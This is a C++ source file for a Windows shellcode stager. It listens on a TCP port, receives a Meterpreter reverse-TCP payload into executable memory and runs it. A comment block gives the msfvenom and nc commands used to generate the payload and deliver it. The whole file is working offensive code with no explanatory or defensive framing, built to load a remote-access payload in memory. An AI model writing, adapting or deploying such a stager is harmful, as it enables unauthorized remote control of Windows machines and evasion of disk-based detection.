#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

/*
	msfvenom -p windows/x64/meterpreter_reverse_tcp lhost= lport= exitfunc=thread -f c > met.c
	tail -n +2 met.c > met2.c
	cat met2.c | tr -d "\"" | tr -d ";" | tr -d  '\n' | tee met3.c
	echo -e `cat met3.c` | nc -v <listener ip> <listener port>
*/

int main(int argc, const char * argv[])
{
	PCSTR port;

	if (argc == 2)
	{
		port = argv[1];
	}
	else
	{
		port = "443";
	}

	LPWSADATA wsaData = new WSAData();
	ADDRINFOA* socketHint = new ADDRINFOA();
	ADDRINFOA* addressInfo = new ADDRINFOA();
	SOCKET listenSocket = INVALID_SOCKET;
	SOCKET clientSocket = INVALID_SOCKET;
	int stage2 = 203846; //msfvenom -p windows/x64/meterpreter_reverse_tcp lhost= lport= -f c | grep bytes
	INT receivedBytes = 0;

	socketHint->ai_family = AF_INET;
	socketHint->ai_socktype = SOCK_STREAM;
	socketHint->ai_protocol = IPPROTO_TCP;
	socketHint->ai_flags = AI_PASSIVE;

	WSAStartup(MAKEWORD(2, 2), wsaData);
	GetAddrInfoA(NULL, port, socketHint, &addressInfo);

	listenSocket = socket(addressInfo->ai_family, addressInfo->ai_socktype, addressInfo->ai_protocol);
	bind(listenSocket, addressInfo->ai_addr, addressInfo->ai_addrlen);
	listen(listenSocket, SOMAXCONN);
	
	printf("[+] started listener on port %s\n", port);
	
	clientSocket = accept(listenSocket, NULL, NULL);

	LPVOID shellcode = VirtualAlloc(NULL, stage2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	LPVOID bakAddr = shellcode;

	int receivedAll = 0;
	do
	{
		receivedBytes = recv(clientSocket, (char *)shellcode, stage2, NULL);
		receivedAll += receivedBytes;
		printf("receivedBytes: %d\n", receivedBytes);
		shellcode = ((char*)shellcode) + receivedBytes;
		stage2 = stage2 - receivedBytes;
		printf("left: %d\n", stage2);
	} while (stage2 > 0);

	((void(*)())bakAddr)();
}